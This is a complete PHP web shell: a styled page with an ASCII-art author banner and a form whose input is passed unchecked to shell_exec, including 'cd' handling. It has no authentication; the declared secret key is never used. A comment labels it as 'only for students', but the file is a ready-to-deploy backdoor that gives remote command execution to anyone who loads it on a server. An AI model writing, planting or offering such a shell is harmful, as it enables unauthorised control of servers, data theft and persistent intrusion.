<?php
//hanya sebatas untuk siswa
$secretKey = "test";

function rgbGradient($startRgb, $endRgb, $steps) {
    $gradient = [];
    for ($i = 0; $i < $steps; $i++) {
        $r = intval($startRgb[0] + ($endRgb[0] - $startRgb[0]) * $i / ($steps - 1));
        $g = intval($startRgb[1] + ($endRgb[1] - $startRgb[1]) * $i / ($steps - 1));
        $b = intval($startRgb[2] + ($endRgb[2] - $startRgb[2]) * $i / ($steps - 1));
        $gradient[] = sprintf('background-color: rgb(%d,%d,%d);', $r, $g, $b);
    }
    return $gradient;
}

function rgbBannerHtml() {
    $banner = <<<EOD
▄ •▄  ▄ .▄       ▄▄▄·▄▄▄ .▄▄▄▄▄.▄▄ ·  Version     : #1.0.1
█▌▄▌▪██▪▐█▪     ▐█ ▄█▀▄.▀·•██  ▐█ ▀.  Github      : https://github.com/adjidev
▐▀▀▄·██▀▐█ ▄█▀▄  ██▀·▐▀▀▪▄ ▐█.▪▄▀▀▀█▄ Sites       : https://ailibytes.xyz
▐█.█▌██▌▐▀▐█▌.▐▌▐█▪·•▐█▄▄▌ ▐█▌·▐█▄▪▐█ Telegram    : https://t.me/rizkykianadji
·▀  ▀▀▀▀ · ▀█▄▀▪.▀    ▀▀▀  ▀▀▀  ▀▀▀▀  Youtube     : https://youtube.com/@rizkykianadji
EOD;

    $startRgb = [255, 0, 0];
    $endRgb = [128, 0, 128];

    $lines = explode("\n", $banner);
    $gradient = rgbGradient($startRgb, $endRgb, count($lines));

    $html = "<div style='font-family: monospace;'>";
    foreach ($lines as $i => $line) {
        $html .= "<div style='{$gradient[$i]}'>{$line}</div>";
    }
    $html .= "</div>";
    return $html;
}

function handleCommand($command) {
    if (substr($command, 0, 3) === 'cd ') {
        $directory = substr($command, 3);
        if (chdir($directory)) {
            return "Changed directory to: " . getcwd();
        } else {
            return "No such directory: {$directory}";
        }
    }

    return shell_exec($command);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $command = $_POST['command'] ?? '';
    $output = handleCommand($command);
} else {
    $output = '';
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .banner {
            margin-bottom: 20px;
        }
        .output {
            background: #333;
            color: #eee;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
            font-family: monospace;
        }
        .input-group {
            margin-top: 20px;
        }
        .input-group input {
            width: calc(100% - 110px);
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .input-group button {
            padding: 10px 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #007bff;
            color: #fff;
            cursor: pointer;
        }
        .input-group button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner">
            <?php echo rgbBannerHtml(); ?>
        </div>
        <div class="output">
            <?php echo htmlspecialchars($output); ?>
        </div>
        <form method="post" class="input-group">
            <input type="text" name="command" placeholder="Enter command" autofocus>
            <button type="submit">Execute</button>
        </form>
    </div>
</body>
</html>
